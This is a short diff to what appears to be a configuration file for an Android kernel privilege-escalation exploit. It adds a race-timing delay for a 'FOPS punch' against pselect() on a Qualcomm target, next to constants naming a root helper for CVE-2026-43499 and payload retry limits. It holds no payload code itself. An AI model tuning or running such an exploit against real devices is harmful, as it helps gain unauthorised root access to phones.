@@ -82,6 +82,12 @@
 
 /* Let core612 detect the boot's MTE state at runtime. */
 
+/* Nezha's direct FOPS punch otherwise races ahead of pselect()'s waiter
+ * overlay. Keep the imported core's default unchanged for other targets and
+ * give this Qualcomm profile the same entry guard already used by its slide
+ * route. */
+#define PSELECT_FOPS_ENTER_DELAY_USEC 50000
+
 #define ROOT_HELPER_PATH "/data/local/tmp/cve-2026-43499-root"
 #define PAYLOAD_ATTEMPT_BUDGET 3
 #define PAYLOAD_ATTEMPT_TIMEOUT_SEC 300
